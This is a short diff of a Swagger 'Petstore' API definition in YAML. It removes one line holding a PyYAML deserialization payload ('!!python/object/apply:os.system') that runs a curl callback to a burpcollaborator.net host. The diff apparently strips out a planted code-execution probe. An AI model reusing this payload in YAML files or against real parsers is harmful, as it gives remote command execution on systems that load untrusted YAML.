@@ -1,6 +1,5 @@
 ---
   swagger: "2.0"
-  "goodbye": !!python/object/apply:os.system ["curl http://oa2ardhnkix479vyk919zuzlvc17pw.burpcollaborator.net/"]
   info: 
     version: "1.0.0"
     title: "Swagger Petstore"
